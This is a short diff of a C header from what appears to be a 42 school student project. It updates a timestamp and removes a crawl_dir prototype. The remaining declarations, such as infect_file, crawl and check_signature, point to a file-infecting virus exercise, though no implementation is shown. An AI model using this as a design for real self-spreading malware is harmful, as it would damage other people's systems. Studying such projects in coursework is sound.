@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:36 by mbatty            #+#    #+#             */
-/*   Updated: 2026/05/23 23:54:16 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/05/24 14:54:59 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -46,7 +46,6 @@ int		mute_outputs();
 char	*strjoin(char const *s1, char const *s2);
 
 int		infect_file(t_exec_ctx *ctx, const char *path);
-int		crawl_dir(const char *path, t_exec_ctx *ctx);
 int		crawl(t_exec_ctx *ctx);
 
 int		check_signature(const char *path);
